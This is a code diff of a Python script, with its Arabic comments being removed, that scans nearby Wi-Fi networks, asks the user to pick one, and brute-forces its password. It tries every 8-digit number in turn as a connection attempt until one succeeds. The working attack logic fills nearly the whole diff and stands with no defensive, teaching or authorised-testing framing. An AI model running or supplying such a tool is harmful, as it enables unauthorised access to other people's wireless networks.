@@ -11,9 +11,9 @@ def scan_wifi():
             print("No Wi-Fi interfaces found.")
             return None
 
-        inf = interfaces[0]  # الحصول على أول واجهة WiFi متاحة
+        inf = interfaces[0]  
         inf.scan()
-        time.sleep(2)  # الانتظار لإعطاء الوقت للمسح
+        time.sleep(2) 
         scan_results = inf.scan_results()
         
         if len(scan_results) == 0:
@@ -39,38 +39,34 @@ def connect_to_wifi(inf, ssid, password):
 
     inf.remove_all_network_profiles()
     temp_prof = inf.add_network_profile(profile)
-    
-    time.sleep(0.05)  # تقليل وقت الانتظار بعد إعداد البروفايل
+    time.sleep(0.05)  
     inf.connect(temp_prof)
-    
-    time.sleep(0.1)  # تقليل الانتظار لمحاولة الاتصال
+    time.sleep(0.1) 
 
     if inf.status() == const.IFACE_CONNECTED:
         print(f"Password is correct: {password}")
         return True
     else:
-        inf.disconnect()  # قطع الاتصال إذا كان غير صحيح
-        time.sleep(0.05)  # تقليل وقت الانتظار للتأكد من الانفصال
+        inf.disconnect()  
+        time.sleep(0.05)  
         return False
 
 def run_password_attempts(inf, ssid):
-    for num in range(100000000):  # الأرقام من 00000000 إلى 99999999
-        password = f"{num:08d}"  # تحويل الرقم إلى سلسلة مكونة من 8 أرقام
-        print(f"Trying password: {password}")  # عرض المحاولة الحالية
+    for num in range(100000000): 
+        password = f"{num:08d}"  
+        print(f"Trying password: {password}")  
         if connect_to_wifi(inf, ssid, password):
             print(f"Password found: {password}")
             break
 
 if __name__ == "__main__":
     interface, networks = scan_wifi()
-
     if interface and networks:
-        # السماح للمستخدم باختيار الشبكة
         choice = int(input("Enter the number of the network you want to connect to: "))
         
         if choice < 0 or choice >= len(networks):
             print("Invalid choice.")
         else:
-            ssid = networks[choice].ssid  # اسم الشبكة (SSID)
+            ssid = networks[choice].ssid  
             print(f"Selected network: {ssid}")
             run_password_attempts(interface, ssid)
